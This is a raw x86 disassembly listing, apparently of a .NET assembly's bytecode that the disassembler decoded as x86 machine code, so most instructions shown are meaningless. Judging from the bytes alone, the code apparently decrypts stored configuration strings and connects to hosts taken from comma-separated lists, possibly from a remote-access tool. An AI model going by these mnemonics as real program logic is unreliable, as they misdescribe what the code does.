  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	1d 03 00 70 80       	sbb    $0x80700003,%eax
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	d0 03                	rolb   $1,(%ebx)
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	83 04 00 70          	addl   $0x70,(%eax,%eax,1)
  4028f9:	80 05 00 00 04 72 91 	addb   $0x91,0x72040000
  402900:	04 00                	add    $0x0,%al
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	b9 04 00 70 80       	mov    $0x80700004,%ecx
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	13 05 00 70 80 08    	adc    0x8807000,%eax
  402919:	00 00                	add    %al,(%eax)
  40291b:	04 72                	add    $0x72,%al
  40291d:	c6 05 00 70 80 09 00 	movb   $0x0,0x9807000
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	21 18                	and    %ebx,(%eax)
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	d4 1f                	aam    $0x1f
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	87 20                	xchg   %esp,(%eax)
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	3a 21                	cmp    (%ecx),%ah
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	ed                   	in     (%dx),%eax
  402956:	21 00                	and    %eax,(%eax)
  402958:	70 80                	jo     0x4028da
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	f1                   	int1
  402960:	21 00                	and    %eax,(%eax)
  402962:	70 80                	jo     0x4028e4
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4029a2:	22 00                	and    (%eax),%al
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 ae 22 00       	add    $0x22ae72,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	ae                   	scas   %es:(%edi),%al
  402aa0:	22 00                	and    (%eax),%al
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 b0 22    	add    %esp,0x22b07216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
